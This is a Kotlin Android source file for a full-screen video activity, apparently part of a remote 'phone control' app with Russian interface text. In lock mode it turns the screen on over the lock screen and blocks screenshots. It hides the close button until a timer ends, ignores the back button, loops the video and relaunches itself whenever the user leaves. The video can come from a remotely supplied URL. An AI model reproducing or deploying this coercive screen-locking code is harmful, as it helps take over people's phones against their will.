package com.phonecontrol

import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.SurfaceHolder
import android.view.SurfaceView
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageButton
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class VideoActivity : AppCompatActivity() {

    private var mediaPlayer: MediaPlayer? = null
    private lateinit var surfaceView: SurfaceView
    private lateinit var closeButton: ImageButton
    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private val handler = Handler(Looper.getMainLooper())
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var videoResId: Int = 0
    private var videoUrl: String? = null
    private var lockMode: Boolean = false
    private var duration: Int = 0

    private var surfaceReady = false
    private var videoReady = false
    private var videoFile: File? = null
    private var secondsWatched = 0
    private var watchTimer: Job? = null
    private var canClose = false

    companion object {
        private const val TAG = "VideoActivity"
        const val EXTRA_VIDEO_NUM = "video_num"
        const val EXTRA_VIDEO_URL = "video_url"
        const val EXTRA_LOCK = "lock"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_SECONDS_WATCHED = "seconds_watched"

        var lockActive = false

        fun startBuiltin(context: Context, videoNum: Int, lock: Boolean = false, duration: Int = 0, secondsWatched: Int = 0) {
            context.startActivity(Intent(context, VideoActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                putExtra(EXTRA_VIDEO_NUM, videoNum)
                putExtra(EXTRA_LOCK, lock)
                putExtra(EXTRA_DURATION, duration)
                putExtra(EXTRA_SECONDS_WATCHED, secondsWatched)
            })
        }

        fun startFromUrl(context: Context, url: String, lock: Boolean = false, duration: Int = 0, secondsWatched: Int = 0) {
            context.startActivity(Intent(context, VideoActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                putExtra(EXTRA_VIDEO_URL, url)
                putExtra(EXTRA_LOCK, lock)
                putExtra(EXTRA_DURATION, duration)
                putExtra(EXTRA_SECONDS_WATCHED, secondsWatched)
            })
        }

        fun unlock() {
            lockActive = false
        }

        fun getCacheFile(context: Context, url: String): File {
            return File(context.cacheDir, "raw_${url.hashCode()}.mp4")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        videoUrl = intent.getStringExtra(EXTRA_VIDEO_URL)
        lockMode = intent.getBooleanExtra(EXTRA_LOCK, false)
        duration = intent.getIntExtra(EXTRA_DURATION, 0)
        secondsWatched = intent.getIntExtra(EXTRA_SECONDS_WATCHED, 0)

        val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
        if (videoNum > 0) {
            videoResId = when (videoNum) {
                1 -> R.raw.video1
                2 -> R.raw.video2
                3 -> R.raw.video3
                else -> R.raw.video1
            }
            videoReady = true
        }

        if (lockMode) lockActive = true

        if (duration > 0 && secondsWatched >= duration) {
            canClose = true
            lockActive = false
        }

        buildUI()

        if (videoUrl != null) downloadVideo(videoUrl!!)
    }

    override fun onStop() {
        super.onStop()
        if (lockActive && !canClose) {
            handler.postDelayed({
                if (lockActive && !canClose) {
                    val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
                    if (videoNum > 0) {
                        startBuiltin(applicationContext, videoNum, true, duration, secondsWatched)
                    } else {
                        videoUrl?.let { startFromUrl(applicationContext, it, true, duration, secondsWatched) }
                    }
                }
            }, 400L)
        }
    }

    private fun buildUI() {
        val root = FrameLayout(this).apply {
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        surfaceView = SurfaceView(this)
        root.addView(surfaceView, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT,
            Gravity.CENTER
        ))

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            visibility = if (videoUrl != null) android.view.View.VISIBLE else android.view.View.GONE
        }
        root.addView(progressBar, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, 8, Gravity.BOTTOM
        ).apply { bottomMargin = 100 })

        statusText = TextView(this).apply {
            setTextColor(android.graphics.Color.WHITE)
            textSize = 16f
            text = if (videoUrl != null) "Загрузка видео..." else ""
            visibility = if (videoUrl != null) android.view.View.VISIBLE else android.view.View.GONE
        }
        root.addView(statusText, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.WRAP_CONTENT,
            FrameLayout.LayoutParams.WRAP_CONTENT,
            Gravity.CENTER
        ))

        closeButton = ImageButton(this).apply {
            setImageResource(android.R.drawable.ic_menu_close_clear_cancel)
            setBackgroundColor(android.graphics.Color.parseColor("#CC000000"))
            alpha = if (canClose) 1f else 0f
            setPadding(24, 24, 24, 24)
            setOnClickListener {
                if (canClose) {
                    lockActive = false
                    finishAndRemoveTask()
                }
            }
        }
        root.addView(closeButton, FrameLayout.LayoutParams(120, 120, Gravity.TOP or Gravity.END).apply {
            topMargin = 80; rightMargin = 40
        })

        setContentView(root)

        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                surfaceReady = true
                tryPlay()
            }
            override fun surfaceChanged(holder: SurfaceHolder, f: Int, w: Int, h: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) { surfaceReady = false }
        })
    }

    private fun tryPlay() {
        if (!surfaceReady || !videoReady) return

        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer()

            if (videoResId != 0 && videoUrl == null) {
                val afd = resources.openRawResourceFd(videoResId)
                mediaPlayer!!.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
            } else {
                mediaPlayer!!.setDataSource(videoFile!!.path)
            }

            mediaPlayer!!.setDisplay(surfaceView.holder)
            mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
            mediaPlayer!!.setOnCompletionListener {
                if (lockMode && !canClose) {
                    mediaPlayer?.seekTo(0)
                    mediaPlayer?.start()
                } else {
                    lockActive = false
                    finishAndRemoveTask()
                }
            }
            mediaPlayer!!.setOnErrorListener { _, what, extra ->
                Log.e(TAG, "MediaPlayer error: $what extra=$extra")
                finishAndRemoveTask()
                true
            }
            mediaPlayer!!.prepare()
            mediaPlayer!!.start()

            if (!canClose) startWatchTimer()

        } catch (e: Exception) {
            Log.e(TAG, "tryPlay failed: ${e.message}", e)
            finishAndRemoveTask()
        }
    }

    private fun startWatchTimer() {
        watchTimer?.cancel()

        if (duration == 0 && !lockMode) {
            handler.postDelayed({
                canClose = true
                showCloseButton()
            }, 3000L)
            return
        }

        if (duration == 0 && lockMode) {
            return
        }

        watchTimer = scope.launch {
            while (secondsWatched < duration) {
                delay(1000)
                secondsWatched++
                val remaining = duration - secondsWatched
                if (remaining <= 10 && remaining > 0) {
                    handler.post {
                        statusText.text = "Осталось: $remaining сек"
                        statusText.visibility = android.view.View.VISIBLE
                    }
                }
            }
            handler.post {
                statusText.visibility = android.view.View.GONE
                canClose = true
                lockActive = false
                showCloseButton()
            }
        }
    }

    private fun showCloseButton() {
        closeButton.animate().alpha(1f).setDuration(300).start()
    }

    private fun downloadVideo(url: String) {
        val cacheFile = getCacheFile(this, url)
        if (cacheFile.exists() && cacheFile.length() > 0) {
            videoFile = cacheFile
            videoReady = true
            handler.post {
                progressBar.visibility = android.view.View.GONE
                statusText.visibility = android.view.View.GONE
                tryPlay()
            }
            return
        }

        scope.launch {
            try {
                handler.post { statusText.text = "Скачиваю видео..." }
                val connection = URL(url).openConnection() as HttpURLConnection
                connection.connectTimeout = 15_000
                connection.readTimeout = 30_000
                connection.instanceFollowRedirects = true
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")
                connection.connect()

                val totalSize = connection.contentLength.toLong()
                val tmpFile = File(cacheDir, "tmp_${System.currentTimeMillis()}.mp4")

                connection.inputStream.use { input ->
                    FileOutputStream(tmpFile).use { output ->
                        val buffer = ByteArray(8192)
                        var downloaded = 0L
                        var read: Int
                        while (input.read(buffer).also { read = it } != -1) {
                            output.write(buffer, 0, read)
                            downloaded += read
                            if (totalSize > 0) {
                                val progress = (downloaded * 100 / totalSize).toInt()
                                handler.post {
                                    progressBar.progress = progress
                                    statusText.text = "Загрузка: $progress%"
                                }
                            }
                        }
                    }
                }

                tmpFile.renameTo(cacheFile)
                videoFile = cacheFile
                videoReady = true

                handler.post {
                    progressBar.visibility = android.view.View.GONE
                    statusText.visibility = android.view.View.GONE
                    tryPlay()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Download failed: ${e.message}", e)
                handler.post { statusText.text = "Ошибка: ${e.message}" }
                delay(3000)
                handler.post { finishAndRemoveTask() }
            }
        }
    }

    private fun adjustSurfaceSize(videoWidth: Int, videoHeight: Int) {
        if (videoWidth == 0 || videoHeight == 0) return
        val screenWidth = resources.displayMetrics.widthPixels
        val screenHeight = resources.displayMetrics.heightPixels
        val scale = minOf(screenWidth.toFloat() / videoWidth, screenHeight.toFloat() / videoHeight)
        val lp = surfaceView.layoutParams as FrameLayout.LayoutParams
        lp.width = (videoWidth * scale).toInt()
        lp.height = (videoHeight * scale).toInt()
        lp.gravity = Gravity.CENTER
        surfaceView.layoutParams = lp
    }

    override fun onBackPressed() {
        if (canClose) {
            lockActive = false
            super.onBackPressed()
        }
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        watchTimer?.cancel()
        scope.cancel()
        try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (e: Exception) { }
        mediaPlayer = null
        finishAndRemoveTask()
        super.onDestroy()
    }
}
